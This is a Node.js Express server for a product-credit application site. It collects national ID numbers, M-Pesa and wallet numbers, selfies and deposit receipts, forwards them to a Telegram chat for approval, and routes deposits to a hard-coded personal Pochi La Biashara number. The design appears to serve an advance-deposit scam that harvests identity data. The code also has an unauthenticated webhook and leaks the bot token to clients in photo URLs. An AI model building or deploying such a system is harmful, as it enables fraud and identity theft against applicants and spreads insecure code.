const express = require('express');
const fetch = require('node-fetch');
const path = require('path');
const helmet = require('helmet');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const POCHI_NUMBER = process.env.POCHI_NUMBER || '0757648339';

app.use(helmet());
app.use(express.json({ limit: '20mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const applications = {};

async function sendTelegramAdminPrompt(appId, details) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

    const text = `
🟢 *NEW CREDIT APPLICATION RECEIVED* 🟢
🆔 *Application ID:* \`${appId}\`

📦 *Model:* ${details.product.model}
🏷️ *Category:* ${details.product.category}
💵 *Required Deposit:* KES ${details.amount}

🆔 *National ID:* \`${details.idNumber}\`
📍 *Delivery Location:* ${details.location}
📲 *M-Pesa Line:* \`${details.mpesaNumber}\`
💳 *Payment Wallet:* \`${details.walletNumber}\`
📷 *Selfie Uploaded:* ${details.selfieDataUrl ? '✅ Yes' : '❌ No'}
🧾 *Receipt Screenshot:* ${details.paymentScreenshotDataUrl ? '✅ Yes' : '❌ No'}

💰 *Payment Target:* Pochi La Biashara (${POCHI_NUMBER})

⏳ *Action Required:* Check attached receipt screenshot & approve transaction?
💡 *Tip:* Reply to this message with a live product photo to send it directly to the applicant!
    `;

    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ YES APPROVE', callback_data: `approve_${appId}` },
                { text: '❌ REJECT / UNPAID', callback_data: `reject_${appId}` }
            ]
        ]
    };

    const primaryImage = details.paymentScreenshotDataUrl || details.selfieDataUrl;

    if (primaryImage && primaryImage.startsWith('data:image')) {
        try {
            const base64Data = primaryImage.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('photo', buffer, { filename: 'payment_receipt.jpg', contentType: 'image/jpeg' });
            form.append('caption', text);
            form.append('parse_mode', 'Markdown');
            form.append('reply_markup', JSON.stringify(inlineKeyboard));

            // Instant fire-and-forget transmission
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: form
            }).catch(e => console.error('Telegram photo send error:', e));

            // Send secondary selfie image if both exist
            if (details.paymentScreenshotDataUrl && details.selfieDataUrl && details.selfieDataUrl.startsWith('data:image')) {
                const selfieBuffer = Buffer.from(details.selfieDataUrl.split(',')[1], 'base64');
                const selfieForm = new FormData();
                selfieForm.append('chat_id', TELEGRAM_CHAT_ID);
                selfieForm.append('photo', selfieBuffer, { filename: 'selfie.jpg', contentType: 'image/jpeg' });
                selfieForm.append('caption', `📷 *Selfie ID Verification Photo for App ID:* \`${appId}\``);
                selfieForm.append('parse_mode', 'Markdown');

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: selfieForm
                }).catch(e => console.error('Telegram selfie send error:', e));
            }
            return;
        } catch (err) {
            console.error('Failed to send photo to Telegram, fallback to text:', err);
        }
    }

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown', reply_markup: inlineKeyboard })
    }).catch(e => console.error('Telegram text send error:', e));
}

app.post('/api/process-credit-app', async (req, res) => {
    try {
        const { product, idNumber, location, mpesaNumber, walletNumber, amount, selfieDataUrl, paymentScreenshotDataUrl } = req.body;
        
        if (!selfieDataUrl || !paymentScreenshotDataUrl) {
            return res.status(400).json({ success: false, message: 'Selfie and payment receipt photos are required.' });
        }

        const appId = 'APP_' + Date.now();
        applications[appId] = { status: 'PENDING', product, idNumber, location, mpesaNumber, walletNumber, amount, selfieDataUrl, paymentScreenshotDataUrl, itemPhotoUrl: null };

        // Trigger immediate dispatch to Telegram
        sendTelegramAdminPrompt(appId, applications[appId]);

        res.status(200).json({ success: true, appId: appId });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ success: false, message: 'Internal server error' });
    }
});

app.get('/api/check-status/:appId', (req, res) => {
    const appData = applications[req.params.appId];
    if (!appData) return res.json({ status: 'PENDING', photoUrl: null });
    res.json({ status: appData.status, photoUrl: appData.itemPhotoUrl });
});

app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.message && update.message.photo && update.message.reply_to_message) {
            const replyText = update.message.reply_to_message.caption || update.message.reply_to_message.text || '';
            const appIdMatch = replyText.match(/APP_\d+/);

            if (appIdMatch) {
                const appId = appIdMatch[0];
                const photos = update.message.photo;
                const fileId = photos[photos.length - 1].file_id;

                const fileRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`);
                const fileData = await fileRes.json();

                if (fileData.ok) {
                    const filePath = fileData.result.file_path;
                    const fullPhotoUrl = `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${filePath}`;

                    if (applications[appId]) {
                        applications[appId].itemPhotoUrl = fullPhotoUrl;
                    }

                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: update.message.chat.id,
                            reply_to_message_id: update.message.message_id,
                            text: `📸 *Photo received!* Sent to applicant view on website.`,
                            parse_mode: 'Markdown'
                        })
                    }).catch(e => console.error(e));
                }
            }
        }

        if (update.callback_query) {
            const query = update.callback_query;
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            const [action, appId] = query.data.split('_APP_');
            const fullAppId = 'APP_' + appId;

            const existingCaption = query.message.caption || query.message.text || '';

            if (action === 'approve') {
                if (applications[fullAppId]) applications[fullAppId].status = 'APPROVED';
                
                const updateMethod = query.message.caption ? 'editMessageCaption' : 'editMessageText';
                const bodyObj = { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' };
                if (query.message.caption) bodyObj.caption = `${existingCaption}\n\n✅ *STATUS:* APPROVED & DISPATCHED 🎉`;
                else bodyObj.text = `${existingCaption}\n\n✅ *STATUS:* APPROVED & DISPATCHED 🎉`;

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${updateMethod}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(bodyObj)
                }).catch(e => console.error(e));
            } else if (action === 'reject') {
                if (applications[fullAppId]) applications[fullAppId].status = 'REJECTED';
                
                const updateMethod = query.message.caption ? 'editMessageCaption' : 'editMessageText';
                const bodyObj = { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' };
                if (query.message.caption) bodyObj.caption = `${existingCaption}\n\n❌ *STATUS:* REJECTED / PAYMENT UNPAID ⚠️`;
                else bodyObj.text = `${existingCaption}\n\n❌ *STATUS:* REJECTED / PAYMENT UNPAID ⚠️`;

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${updateMethod}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(bodyObj)
                }).catch(e => console.error(e));
            }

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: query.id })
            }).catch(e => console.error(e));
        }

        res.sendStatus(200);
    } catch (err) {
        console.error('Webhook error:', err);
        res.sendStatus(500);
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
